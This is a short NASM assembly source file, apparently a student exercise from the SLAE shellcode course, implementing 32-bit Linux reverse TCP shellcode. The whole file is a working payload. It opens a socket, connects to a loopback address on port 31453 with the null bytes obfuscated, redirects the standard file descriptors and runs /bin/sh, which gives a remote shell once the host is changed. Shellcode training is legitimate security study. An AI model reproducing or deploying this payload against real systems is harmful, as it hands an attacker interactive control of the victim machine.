; Filename: reverse.nasm
; Author:  msstavros
; Student-ID: SLAE-645 
;
; Purpose: shellcode to create a reverse tcp socket and execute a shell on connect


global _start			

section .text
_start:
	xor eax,eax		;initialize registers
	xor ebx,ebx
	xor ecx,ecx
	
	;socket() call
	mov al, 0x66		;syscall 102, sys_socketcall
	mov bl, 0x01		;socket()
	push 0x06		;IPPROTO_TCP
	push 0x01		;SOCK_STREAM
	push 0x02		;AFINET
	mov ecx,esp		;pointer to parameters
	int 0x80		;syscall

	mov edx,eax		;store sockfd in edx
	
	;connect() call
	xor eax,eax
	xor esi,esi		;initialize esi to use for zero padding
	mov al, 0x66		;sys_socketcall
	add bl, 2		;connect()=3, BL was 1 so add 2
	
	push esi		;4 bytes, zero padding=4
	push esi		;4 bytes, zero padding=8
	mov esi, 0xffffffff	;load 0xffffffff
	sub esi,0x80fffffe	;subtract to get 0x7f000001 (127.0.0.1)
	bswap esi		;reverse order of bytes
	push esi		;push on stack	
	push word 0xdd7a	;port 31453=0x7add -- in reverse order!
	push word 0x02		;AFINET 0x0002
	mov ecx, esp		;pointer of above structure on ecx
	
	push 0x10		;address len of address/port structure
	push ecx		;pointer to structure
	push edx		;socfd descriptor
	mov ecx, esp		;pointer to params
	int 0x80		;syscall


	mov ebx, edx		;move sockfd in ebx for the dup2 function
				;for use in the dup2 calls

	;dup2() syscall
	xor eax, eax		;initialize eax
	xor ecx,ecx		;initialize ecx
	mov cl,0x2		;ecx will also be used for counting backwards.
				;2,1,0 the values for the 3 file descriptors
duploop:
	mov al, 0x3f
	int 0x80
	dec ecx
	jns duploop		;Check if ecx is -1, by checking the Sign Flag is set

	;execve_stack /bin/sh
	xor eax, eax
	push eax		;4 null bytes on stack
	push 0x68732f2f		;/bin//sh on stack
	push 0x6e69622f
	mov ebx, esp		;pointer to command in ebx
	push eax		;4 null bytes, envp pointer
	mov edx, esp		;store it in edx
	push ebx		;again the pointer to /bin/sh
	mov ecx, esp		;store the address to this in ecx
	mov al, 0x0b		;execve
	int 0x80		;syscall





